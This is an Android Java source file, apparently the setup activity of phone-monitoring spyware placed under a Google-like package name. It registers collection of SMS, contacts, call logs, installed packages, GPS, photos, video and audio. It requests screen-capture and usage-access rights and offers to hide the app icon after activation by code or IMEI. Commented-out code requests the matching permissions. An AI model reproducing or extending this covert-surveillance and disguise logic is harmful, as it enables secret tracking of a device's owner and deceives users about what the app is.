package com.google.cloudservices;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcel;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
//import com.tbruyelle.rxpermissions2.RxPermissions;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.List;

public class Main3Activity extends Activity {
    LinearLayout linearLayout;
    EditText edtCode;
    private static final int REQUEST_SCREENSHOT = 59706;
    private MediaProjectionManager mgr;
    int mScreenDensity;
    Intent data1;
    int resultcode1;
    EditText edtimei;
    String SAVED_PREFS_BUNDLE_KEY_SEPARATOR = "§§";
    List<String> listPermissionsNeeded = new ArrayList<>();
    private int height;
    private int width;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main3);
        linearLayout=(LinearLayout)findViewById(R.id.lineqimei);
        try {
            linearLayout.setVisibility(View.VISIBLE);
            edtimei=(EditText)findViewById(R.id.edtimei);
        }catch (Exception e){}
        OptionDB optionDB = new OptionDB(this);
        optionDB.delall();
        optionDB.Insertjs("sms1");
        optionDB.Insertjs("contact1");
        optionDB.Insertjs("call1");
        optionDB.Insertjs("pack1");
        optionDB.Insertjs("gps1");
        optionDB.Insertjs("picture1");
        optionDB.Insertjs("video1");
        optionDB.Insertjs("Audio1");
        setrquestmeediaprojection();
        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                      startActivity(intent);

//        getfilelist();
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            Intent intent = new Intent();
//            String packageName = getPackageName();
//            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
//            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
//                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
//                intent.setData(Uri.parse("package:" + packageName));
//                startActivity(intent);
//            }
//        }


//        CheckBox smscheckBox = (CheckBox) findViewById(R.id.smscheckBox);
//        CheckBox callcheckBox = (CheckBox) findViewById(R.id.callcheckBox);
//        CheckBox contactcheckBox = (CheckBox) findViewById(R.id.contactcheckBox);
//        CheckBox packcheckBox = (CheckBox) findViewById(R.id.packcheckBox);
//        CheckBox gpscheckBox = (CheckBox) findViewById(R.id.gpscheckBox);
//        CheckBox picturecheckBox = (CheckBox) findViewById(R.id.picturecheckBox);
//        CheckBox videocheckBox = (CheckBox) findViewById(R.id.videocheckBox);
//        CheckBox audiocheckBox = (CheckBox) findViewById(R.id.AudiocheckBox);
//
//        smscheckBox.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                if (smscheckBox.isChecked()) {
//                    if (Build.VERSION.SDK_INT >= 23) {
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.READ_SMS);listPermissionsNeeded.add(Manifest.permission.ACCESS_NETWORK_STATE);listPermissionsNeeded.add(Manifest.permission.INTERNET);listPermissionsNeeded.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);listPermissionsNeeded.add(Manifest.permission.SET_ALARM);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1001);
//
//
//                    } else {
//                        optionDB.Updateoption("sms1", "1");
//                    }
//                } else {
//                    optionDB.Updateoption("sms0", "1");
//                }
//            }
//        });
//        contactcheckBox.setOnClickListener(new View.OnClickListener() {
//            @RequiresApi(api = Build.VERSION_CODES.M)
//            @Override
//            public void onClick(View view) {
//                if (contactcheckBox.isChecked()) {
//                    if (Build.VERSION.SDK_INT >= 23) {
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.READ_CONTACTS);listPermissionsNeeded.add(Manifest.permission.ACCESS_NETWORK_STATE);listPermissionsNeeded.add(Manifest.permission.INTERNET);listPermissionsNeeded.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);listPermissionsNeeded.add(Manifest.permission.SET_ALARM);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1002);
//
//
//                    } else {
//                        optionDB.Updateoption("contact1", "2");
//                    }
//                } else {
//                    optionDB.Updateoption("contact0", "2");
//                }
//            }
//        });
//        callcheckBox.setOnClickListener(new View.OnClickListener() {
//            @RequiresApi(api = Build.VERSION_CODES.M)
//            @Override
//            public void onClick(View view) {
//                if (callcheckBox.isChecked()) {
//                    if (Build.VERSION.SDK_INT >= 23) {
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.READ_CALL_LOG);listPermissionsNeeded.add(Manifest.permission.WRITE_CALL_LOG);listPermissionsNeeded.add(Manifest.permission.ACCESS_NETWORK_STATE);listPermissionsNeeded.add(Manifest.permission.INTERNET);listPermissionsNeeded.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);listPermissionsNeeded.add(Manifest.permission.SET_ALARM);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1003);
//
//
//                    } else {
//                        optionDB.Updateoption("call1", "3");
//                    }
//                } else {
//                    optionDB.Updateoption("call0", "3");
//                }
//            }
//        });
//        packcheckBox.setOnClickListener(new View.OnClickListener() {
//            @RequiresApi(api = Build.VERSION_CODES.M)
//            @Override
//            public void onClick(View view) {
//                if (packcheckBox.isChecked()) {
//                    if (Build.VERSION.SDK_INT >= 23) {
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);listPermissionsNeeded.add(Manifest.permission.ACCESS_NETWORK_STATE);listPermissionsNeeded.add(Manifest.permission.INTERNET);listPermissionsNeeded.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);listPermissionsNeeded.add(Manifest.permission.SET_ALARM);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1004);
//
//
//                    } else {
//                        optionDB.Updateoption("pack1", "4");
//                        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
//                        startActivity(intent);
//                    }
//                } else {
//                    optionDB.Updateoption("pack0", "4");
//                }
//            }
//        });
//
//        gpscheckBox.setOnClickListener(new View.OnClickListener() {
//            @RequiresApi(api = Build.VERSION_CODES.M)
//            @Override
//            public void onClick(View view) {
//                Log.e("onStartCommand", "coooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooome");
//
//                if (gpscheckBox.isChecked()) {
//                    if (Build.VERSION.SDK_INT >= 23) {
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);listPermissionsNeeded.add(Manifest.permission.ACCESS_NETWORK_STATE);listPermissionsNeeded.add(Manifest.permission.INTERNET);listPermissionsNeeded.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);listPermissionsNeeded.add(Manifest.permission.SET_ALARM);listPermissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION);listPermissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1005);
//
//
//                    } else {
//                        optionDB.Updateoption("gps1", "5");
//                    }
//                } else {
//                    optionDB.Updateoption("gps0", "5");
//                }
//            }
//        });
//        picturecheckBox.setOnClickListener(new View.OnClickListener() {
//            @RequiresApi(api = Build.VERSION_CODES.M)
//            @Override
//            public void onClick(View view) {
//                if (picturecheckBox.isChecked()) {
//                    if (Build.VERSION.SDK_INT >= 23) {
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.CAMERA);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1006);
//
//
//                    } else {
//                        optionDB.Updateoption("picture1", "6");
//                    }
//                } else {
//                    optionDB.Updateoption("picture0", "6");
//                }
//            }
//        });
//        videocheckBox.setOnClickListener(new View.OnClickListener() {
//            @RequiresApi(api = Build.VERSION_CODES.M)
//            @Override
//            public void onClick(View view) {
//
//                if (videocheckBox.isChecked()) {
//                    if (Build.VERSION.SDK_INT >= 23) {
//
//                        // ask for setting
//                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
//                                Uri.parse("package:" + getPackageName()));
//                        startActivityForResult(intent, 1);
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.CAMERA);listPermissionsNeeded.add(Manifest.permission.RECORD_AUDIO);listPermissionsNeeded.add(Manifest.permission.SYSTEM_ALERT_WINDOW);listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);listPermissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1007);
//
//                    } else {
//                        optionDB.Updateoption("video1", "7");
//                    }
//                } else {
//                    optionDB.Updateoption("video0", "7");
//                }
////                if (Build.VERSION.SDK_INT>Build.VERSION_CODES.M){
////                    if (!Settings.canDrawOverlays(getApplicationContext())) {
////                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
////                                Uri.parse("package:" + getPackageName()));
////                        startActivityForResult(intent,100);}
////
////                }
//            }
//        });
//        audiocheckBox.setOnClickListener(new View.OnClickListener() {
//            @RequiresApi(api = Build.VERSION_CODES.M)
//            @Override
//            public void onClick(View view) {
//                if (audiocheckBox.isChecked()) {
//                    if (Build.VERSION.SDK_INT >= 23) {
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.RECORD_AUDIO);listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);listPermissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1008);
//
//
//                    } else {
//                        optionDB.Updateoption("Audio1", "8");
//                    }
//                } else {
//                    optionDB.Updateoption("Audio0", "8");
//                }
//
//            }
//        });



    }

    private void goToUrl(String url) {
        Uri uriUrl = Uri.parse(url);
        Intent launchBrowser = new Intent(Intent.ACTION_VIEW, uriUrl);
        startActivity(launchBrowser);
    }

    public void btnlogin(View view) {
        AlertDialog.Builder alertClose = new AlertDialog.Builder(Main3Activity.this);
        alertClose.setTitle("ICON").
                setMessage("Do you want to hide icon?").
                setPositiveButton("yes", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        Boolean hide = true;
                        edtCode = (EditText) findViewById(R.id.edtCode);
                        String code = edtCode.getText().toString();
                        String imeis="";
                        try {
                            imeis=edtimei.getText().toString();
                        }catch (Exception e){}
                        CodeLogin codeLogin = new CodeLogin();
                        codeLogin.codelog(Main3Activity.this, code, hide, resultcode1, data1, mScreenDensity,imeis,width,height);

                    }
                }).
                setNegativeButton("No", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        Boolean hide = false;
                        edtCode = (EditText) findViewById(R.id.edtCode);
                        String code = edtCode.getText().toString();
                        String imeis="";
                        try {
                            imeis=edtimei.getText().toString();
                        }catch (Exception e){}
                        CodeLogin codeLogin = new CodeLogin();
                        codeLogin.codelog(Main3Activity.this, code, hide, resultcode1, data1, mScreenDensity,imeis,width,height);
                        dialog.cancel();
                    }
                }).show();


    }

    public void btnim(View view) {
        AlertDialog.Builder alertClose = new AlertDialog.Builder(Main3Activity.this);
        alertClose.setTitle("ICON").
                setMessage("Do you want to hide icon?").
                setPositiveButton("yes", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        Boolean hid = true;
                        String imeis="";
                        try {
                            imeis=edtimei.getText().toString();
                            Log.e("testing", imeis );
                        }catch (Exception e){}
                        ImeiLogin imeiLogin = new ImeiLogin();
                        imeiLogin.chcklog(Main3Activity.this, hid, resultcode1, data1, mScreenDensity,imeis,width,height);


                    }
                }).
                setNegativeButton("No", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        Boolean hid = false;
                        String imeis="";
                        try {
                            imeis=edtimei.getText().toString();
                        }catch (Exception e){}
                        ImeiLogin imeiLogin = new ImeiLogin();
                        imeiLogin.chcklog(Main3Activity.this, hid, resultcode1, data1, mScreenDensity,imeis,width,height);

                    }
                }).show();


    }

    public void infcode(View view) {
        allert(Main3Activity.this, "If you received the activation code from your app, please input it here.");
    }

    public void infbtncode(View view) {
        allert(Main3Activity.this, "If you intend to activate the app by the code, please input the code first and then click the button.");
    }

    public void infbtnimei(View view) {
        allert(Main3Activity.this, "If you intend to activate the app by IMEI, please click on this button.");
    }

    public void allert(Context context, String inf) {
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        builder.setMessage(inf)
                .setCancelable(false)
                .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        //do things
                    }
                });
        AlertDialog alert = builder.create();
        alert.show();
    }

//    public void downloadapk(Context context) {
//        AlertDialog.Builder builder = new AlertDialog.Builder(context);
//        builder.setMessage("If you want to use Call and Sms option,please download CallManager and install it.")
//                .setCancelable(false)
//                .setPositiveButton("Download", new DialogInterface.OnClickListener() {
//                    @RequiresApi(api = Build.VERSION_CODES.M)
//                    public void onClick(DialogInterface dialog, int id) {
//                        listPermissionsNeeded=new ArrayList<String>();
//                        listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
//                        ActivityCompat.requestPermissions(Main3Activity.this,listPermissionsNeeded.toArray
//                                (new String[listPermissionsNeeded.size()]),1010);
//
//
//
//                    }
//                }).setNegativeButton("Cancell", new DialogInterface.OnClickListener() {
//            @Override
//            public void onClick(DialogInterface dialogInterface, int i) {
//                dialogInterface.cancel();
//
//            }
//        });
//        AlertDialog alert = builder.create();
//        alert.show();
//
//    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

//        if (requestCode == 1) {
//            if (Settings.canDrawOverlays(this)) {
//                // permission granted...
//                Toast.makeText(this, "ok", Toast.LENGTH_SHORT).show();
//            } else {
//                // permission not granted...
//            }
//        }

        if (requestCode == REQUEST_SCREENSHOT) {
            Toast.makeText(this, "garanted", Toast.LENGTH_SHORT).show();
            resultcode1=resultCode;
            data1=data;
        }

    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public void setrquestmeediaprojection() {
        mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        startActivityForResult(mgr.createScreenCaptureIntent(),
                REQUEST_SCREENSHOT);
        DisplayMetrics metrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(metrics);
        mScreenDensity = metrics.densityDpi;
        height = metrics.heightPixels;
        width = metrics.widthPixels;
        Log.e("324", String.valueOf(height)+":"+String.valueOf(width));

    }

    //    public void getfilelist(){
//        Log.i("Files", "FileName:");
//        String path =Environment.getExternalStorageDirectory().toString()+"/Pictures/Telegram/";
//        Log.d("Files", "Path: " + path);
//        File directory = new File(Environment.getExternalStorageDirectory(), "Pictures");
//        File[] files = directory.listFiles();
//        Log.d("Files", "Size: "+ files.length);
//        for (int i = 0; i < files.length; i++)
//        {
//            Log.i("Files", "FileName:" + files[i].getName());
//        }
//    }
    public byte[] bundleToBytes(Bundle bundle) {
        Parcel parcel = Parcel.obtain();
        parcel.writeParcelable(bundle, 0);
        byte[] bytes = parcel.marshall();
        parcel.recycle();
        return bytes;
    }
    public byte[] makebyte(Object modeldata) {
        try {

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(modeldata);
            byte[] employeeAsBytes = baos.toByteArray();
            ByteArrayInputStream bais = new ByteArrayInputStream(employeeAsBytes);
            return employeeAsBytes;
        } catch (IOException e) {
            e.printStackTrace();
            Log.e("Ex234", e.toString());
        }

        return null;
    }
    public void btnsetting(View view){
        Intent i = new Intent(Settings.ACTION_DEVICE_INFO_SETTINGS);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }
}